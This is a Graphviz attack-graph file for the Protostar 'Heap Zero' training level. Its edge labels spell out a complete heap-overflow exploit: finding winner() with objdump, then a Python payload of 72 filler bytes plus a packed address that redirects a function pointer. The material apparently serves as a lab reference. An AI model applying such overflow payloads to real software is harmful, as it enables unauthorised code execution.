digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Heap Zero"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="winner() address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Distance from name to function pointer identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Heap-overflow payload built"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Function pointer redirected to winner()"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/heap0 | grep \" winner$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/heap0 A"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; print \"A\"*72 + struct.pack(\"<I\", 0x08048464)'"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/heap0 $(python -c 'import struct; print \"A\"*72 + struct.pack(\"<I\", 0x08048464)')"];
}
